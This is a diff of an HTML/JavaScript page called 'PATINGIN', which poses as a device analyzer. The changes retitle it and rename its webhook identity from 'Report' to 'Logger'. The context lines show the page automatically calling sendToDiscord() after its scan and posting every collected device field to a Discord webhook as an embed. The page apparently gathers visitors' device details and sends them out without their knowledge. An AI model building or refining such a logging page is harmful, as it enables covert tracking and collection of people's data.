@@ -122,7 +122,7 @@
 
   <div id="scanScreen">
     <div class="title-text">PATINGIN</div>
-    <div class="subtitle">DEVICE ANALYZER</div>
+    <div class="subtitle">SYSTEMS ACTIVE</div>
     <div class="radar"></div>
     <div id="statusTitle">⟩ SCANNING DEVICE</div>
     <div id="statusLine">Initializing...</div>
@@ -196,10 +196,10 @@
     }
     await sleep(400);
     
-    // Populate data
+    // Populate the UI
     await showResults();
     
-    // Automatic Send
+    // AUTOMATIC SEND TO DISCORD
     sendToDiscord();
   }
 
@@ -428,7 +428,7 @@
 
     const lines = Object.entries(_data).map(([k, v]) => `**${k}:** ${v}`).join('\n');
     const payload = {
-      username: "PATINGIN Report",
+      username: "PATINGIN Logger",
       embeds: [{
         title: "📱 PATINGIN Device Report",
         description: lines,
